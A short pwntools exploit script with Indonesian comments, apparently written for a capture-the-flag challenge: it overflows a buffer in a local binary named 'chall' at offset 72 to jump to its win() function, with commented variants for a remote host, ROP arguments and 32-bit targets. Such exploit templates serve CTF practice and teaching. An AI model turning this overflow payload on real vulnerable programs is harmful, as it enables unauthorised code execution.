# Script exploit ret2win dengan pwntools - buffer overflow lompat ke fungsi win().
# Jalankan: python3 ret2win.py

from pwn import *

# ===== Konfigurasi =====
context.binary = elf = ELF("./chall")
io = process("./chall")                 # local
# io = remote("host.ctf.com", 1337)     # remote (ganti host/port)

# ===== Offset (dari cyclic_find) =====
offset = 72

# ===== Alamat fungsi win =====
win_addr = elf.sym.win
print(f"[+] win() @ {hex(win_addr)}")

# ===== Payload =====
payload = b"A" * offset + p64(win_addr)

# ===== Kirim =====
io.sendlineafter(b": ", payload)
io.interactive()

# ===== Kalau ada argumen (64-bit) =====
# rop = ROP(elf)
# rop.win(0xdeadbeef, 0xcafebabe)
# payload = b"A" * offset + rop.chain()

# ===== Kalau 32-bit =====
# payload = b"A" * offset + p32(win_addr)
